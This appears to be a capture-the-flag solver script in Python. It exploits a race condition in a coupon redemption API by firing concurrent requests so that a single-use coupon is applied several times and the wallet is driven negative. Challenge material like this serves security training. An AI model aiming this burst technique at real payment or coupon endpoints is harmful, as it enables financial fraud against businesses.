#!/usr/bin/env python3
"""Solver for race-the-coupon.

Strategy: fire many concurrent POST /api/coupon/redeem requests so several of
them pass the "already redeemed? / balance >= 60?" check before any of them
commits the decrement. Each committer subtracts 60 from a balance that was 100
at check time, driving the authoritative wallet negative. The server then
returns the flag.

Usage:
    python3 solve.py http://HOST:PORT [num_concurrent]

Only depends on the stdlib so it runs anywhere.
"""
import concurrent.futures
import json
import re
import sys
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8080"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 20


def post(path, payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        BASE + path, data=data,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return json.loads(r.read())


def redeem():
    return post("/api/coupon/redeem", {"code": "CASHOUT60"})


def find_flag(obj):
    m = re.search(r"CTF\{[^}]+\}", json.dumps(obj))
    return m.group(0) if m else None


def main():
    # Clean slate (safe: reset never re-derives the flag).
    post("/api/reset", {})
    print(f"[*] start balance: {get('/api/wallet')['balance']}")

    # Barrier-style burst: submit all redeem calls at once.
    with concurrent.futures.ThreadPoolExecutor(max_workers=N) as ex:
        futures = [ex.submit(redeem) for _ in range(N)]
        results = [f.result() for f in futures]

    committed = sum(1 for r in results if r.get("ok"))
    print(f"[*] {committed}/{N} redemptions committed (single-use coupon!)")

    wallet = get("/api/wallet")
    print(f"[*] final balance: {wallet['balance']}  withdrawals: {wallet['withdrawals']}")

    flag = find_flag(results) or find_flag(wallet)
    if flag:
        print(f"[+] FLAG: {flag}")
        return 0
    print("[-] No overdraft yet. Increase concurrency and retry:")
    print(f"      python3 {sys.argv[0]} {BASE} {N * 2}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
